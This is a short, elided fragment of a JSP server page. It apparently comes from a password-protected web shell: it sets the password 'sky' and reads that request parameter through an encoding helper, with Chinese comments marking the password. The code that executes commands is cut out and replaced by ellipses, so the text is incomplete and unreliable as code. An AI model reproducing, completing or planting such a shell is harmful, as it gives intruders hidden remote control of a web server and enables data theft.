...
<%!String Pwd = "sky";
	...
	String EC(String s, String c) throws Exception {
		return new String(s.getBytes("ISO-8859-1"),c);
...
<%
	...
	// 获取参数并转码
	String Z = EC(request.getParameter(Pwd) + "", cs); // 密码
